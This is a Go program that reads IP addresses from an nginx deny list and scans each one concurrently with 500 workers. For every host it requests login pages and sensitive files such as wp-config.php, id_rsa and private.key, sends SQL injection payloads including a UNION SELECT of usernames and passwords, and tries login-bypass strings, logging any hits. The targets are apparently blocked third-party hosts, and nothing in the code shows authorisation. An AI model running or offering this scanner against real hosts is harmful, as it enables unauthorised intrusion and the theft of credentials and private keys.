package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"regexp"
	"sync"
	"time"
)

const (
	filePath    = "/Users/sin/GolandProjects/awesomeProject/http/deny_ips.conf"
	workerCount = 500 // 扩大 worker 数量以处理更多请求
	timeout     = 5 * time.Second
	outputFile  = "./requests.txt"
)

var commonPaths = []string{
	"/login.php",
	"/admin/login.php",
	"/user/login.php",
	"/index.php",
	"/phpinfo.php",
	"/test.php",
}

var sensitiveFiles = []string{
	"/config.php",
	"/wp-config.php",
	"/database.php",
	"/secret.txt",
	"/id_rsa",
	"/private.key",
	"/admin/.htpasswd",
}

var sqlInjectionPayloads = []string{
	"' OR 1=1 --",
	"' OR 'a'='a",
	"1' UNION SELECT null, username, password FROM users--",
	"1' AND 1=1--",
}

var authInjectionPayloads = []string{
	"' OR 'a'='a",
	"' OR 'x'='x",
}

func extractIPs(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var ips []string
	re := regexp.MustCompile(`deny\s+([0-9\.]+);`)
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := scanner.Text()
		matches := re.FindStringSubmatch(line)
		if len(matches) == 2 {
			ips = append(ips, matches[1])
		}
	}
	return ips, scanner.Err()
}

func logRequest(command, response string) {
	// 异步写日志，减少请求阻塞
	go func() {
		file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
		if err != nil {
			fmt.Printf("❌ 无法写入文件: %v\n", err)
			return
		}
		defer file.Close()

		writer := bufio.NewWriter(file)
		_, err = writer.WriteString(fmt.Sprintf("命令: %s\n响应: %s\n\n", command, response))
		if err != nil {
			fmt.Printf("❌ 无法写入文件: %v\n", err)
		}
		writer.Flush()
	}()
}

func scanForVulnerabilities(ip string, wg *sync.WaitGroup, sem chan struct{}, client *http.Client) {
	defer wg.Done()
	defer func() { <-sem }()

	// 扫描常见的登录路径和文件注入路径
	for _, path := range commonPaths {
		url := fmt.Sprintf("http://%s%s", ip, path)
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Printf("[-] 创建请求失败 %s: %v\n", url, err)
			continue
		}

		req.Header.Set("User-Agent", "VulnScanner/1.0")
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("[-] 请求失败 %s: %v\n", url, err)
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == 200 || resp.StatusCode == 401 || resp.StatusCode == 403 {
			logRequest(url, fmt.Sprintf("响应码: %d", resp.StatusCode))
			fmt.Printf("[+] [%d] %s 疑似敏感页面\n", resp.StatusCode, url)
		}
	}

	// 扫描 SQL 注入漏洞
	for _, payload := range sqlInjectionPayloads {
		for _, path := range commonPaths {
			url := fmt.Sprintf("http://%s%s?param=%s", ip, path, payload)
			req, err := http.NewRequest("GET", url, nil)
			if err != nil {
				fmt.Printf("[-] 创建请求失败 %s: %v\n", url, err)
				continue
			}

			req.Header.Set("User-Agent", "VulnScanner/1.0")
			resp, err := client.Do(req)
			if err != nil {
				fmt.Printf("[-] 请求失败 %s: %v\n", url, err)
				continue
			}
			defer resp.Body.Close()

			if resp.StatusCode == 200 {
				logRequest(url, fmt.Sprintf("SQL注入响应码: %d", resp.StatusCode))
				fmt.Printf("[+] [%d] %s 可能存在 SQL 注入漏洞\n", resp.StatusCode, url)
			}
		}
	}

	// 扫描文件注入
	for _, path := range sensitiveFiles {
		url := fmt.Sprintf("http://%s%s", ip, path)
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Printf("[-] 创建请求失败 %s: %v\n", url, err)
			continue
		}

		req.Header.Set("User-Agent", "VulnScanner/1.0")
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("[-] 请求失败 %s: %v\n", url, err)
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			logRequest(url, fmt.Sprintf("响应码: %d", resp.StatusCode))
			fmt.Printf("[+] [%d] %s 可能暴露敏感文件\n", resp.StatusCode, url)
		}
	}

	// 授权注入
	for _, payload := range authInjectionPayloads {
		url := fmt.Sprintf("http://%s/login.php?username=%s&password=%s", ip, payload, payload)
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Printf("[-] 创建请求失败 %s: %v\n", url, err)
			continue
		}

		req.Header.Set("User-Agent", "VulnScanner/1.0")
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("[-] 请求失败 %s: %v\n", url, err)
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			logRequest(url, fmt.Sprintf("授权注入响应码: %d", resp.StatusCode))
			fmt.Printf("[+] [%d] %s 可能存在授权注入漏洞\n", resp.StatusCode, url)
		}
	}
}

func main() {
	// 提取 IP 地址列表
	ips, err := extractIPs(filePath)
	if err != nil {
		fmt.Printf("❌ 读取 IP 文件失败: %v\n", err)
		return
	}

	if len(ips) == 0 {
		fmt.Println("⚠️ 未提取到任何 IP，请检查 deny_ips.conf 内容")
		return
	}

	fmt.Printf("✅ 发现 %d 个 IP，开始扫描...\n", len(ips))

	// 创建 HTTP 客户端，使用连接复用
	client := &http.Client{
		Timeout: timeout,
	}

	// 使用 Goroutines 并发执行扫描
	var wg sync.WaitGroup
	sem := make(chan struct{}, workerCount)

	for _, ip := range ips {
		wg.Add(1)
		sem <- struct{}{}
		go scanForVulnerabilities(ip, &wg, sem, client)
	}

	wg.Wait()
	fmt.Println("✅ 全部扫描完成。")
}
